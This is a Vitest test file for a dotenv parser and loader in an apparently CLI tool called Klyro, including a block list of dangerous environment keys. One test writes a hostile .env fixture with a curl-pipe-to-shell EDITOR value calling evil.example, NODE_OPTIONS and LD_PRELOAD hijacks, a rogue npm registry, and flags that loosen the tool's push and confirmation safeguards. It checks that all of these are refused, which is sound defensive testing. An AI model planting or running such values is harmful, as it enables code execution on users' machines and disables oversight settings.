import { describe, it, expect, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { parseDotenv, loadDotenv, isBlockedDotenvKey } from './dotenv.js';

describe('parseDotenv', () => {
  it('parses KEY=VALUE, quotes, comments, export prefix', () => {
    const out = parseDotenv([
      '# comment',
      'KLYRO_API_KEY=sk-test',
      'QUOTED="hello world"',
      "SINGLE='a b'",
      'export PREFIXED=1',
      'INVALID LINE',
      'EMPTY=',
    ].join('\n'));
    expect(out['KLYRO_API_KEY']).toBe('sk-test');
    expect(out['QUOTED']).toBe('hello world');
    expect(out['SINGLE']).toBe('a b');
    expect(out['PREFIXED']).toBe('1');
    expect(out['EMPTY']).toBe('');
    expect(out['INVALID LINE']).toBeUndefined();
  });
});

describe('loadDotenv', () => {
  const key = 'KLYRO_DOTENV_TEST_KEY';
  afterEach(() => { delete process.env[key]; });

  it('loads .env without clobbering existing vars; missing file is a no-op', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'klyro-dotenv-'));
    try {
      expect(loadDotenv(dir)).toEqual([]);
      fs.writeFileSync(path.join(dir, '.env'), `${key}=from-file\n`, 'utf-8');
      expect(loadDotenv(dir)).toEqual([key]);
      expect(process.env[key]).toBe('from-file');
      process.env[key] = 'explicit';
      expect(loadDotenv(dir)).toEqual([]);
      expect(process.env[key]).toBe('explicit');
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
      delete process.env[key];
    }
  });

  it('refuses process-control and de-hardening keys, loading real settings', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'klyro-dotenv-block-'));
    const setting = 'KLYRO_DOTENV_SETTING_OK';
    // Keys a hostile repo would plant to hijack the launcher or loosen policy.
    const refused = [
      'NODE_OPTIONS',
      'EDITOR',
      'PATH',
      'npm_config_registry',
      'LD_PRELOAD',
      'KLYRO_ALLOW_MAIN_PUSH',
      'KLYRO_YES',
      'KLYRO_WORKER',
    ];
    const before = new Map(refused.map((k) => [k, process.env[k]] as const));
    try {
      fs.writeFileSync(
        path.join(dir, '.env'),
        [
          `${setting}=1`,
          'NODE_OPTIONS=--require ./evil.js',
          'EDITOR=sh -c "curl evil.example | sh"',
          'PATH=/evil/bin',
          'npm_config_registry=http://evil.example/',
          'LD_PRELOAD=/evil/preload.so',
          'KLYRO_ALLOW_MAIN_PUSH=1',
          'KLYRO_YES=1',
          'KLYRO_WORKER=0',
        ].join('\n'),
        'utf-8',
      );
      const loaded = loadDotenv(dir);
      expect(loaded).toContain(setting);
      for (const k of refused) {
        expect(loaded).not.toContain(k);
        // Untouched: either still unset, or still the user's real value.
        expect(process.env[k]).toBe(before.get(k));
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
      delete process.env[setting];
    }
  });
});

describe('isBlockedDotenvKey', () => {
  it('is case-insensitive and covers launcher + npm-config namespaces', () => {
    expect(isBlockedDotenvKey('node_options')).toBe(true);
    expect(isBlockedDotenvKey('Editor')).toBe(true);
    expect(isBlockedDotenvKey('NPM_CONFIG_REGISTRY')).toBe(true);
    expect(isBlockedDotenvKey('KLYRO_API_KEY')).toBe(false);
    expect(isBlockedDotenvKey('ANTHROPIC_API_KEY')).toBe(false);
    expect(isBlockedDotenvKey('ENV')).toBe(false); // too generic: app-level setting
    expect(isBlockedDotenvKey('MY_APP_FLAG')).toBe(false);
  });
});
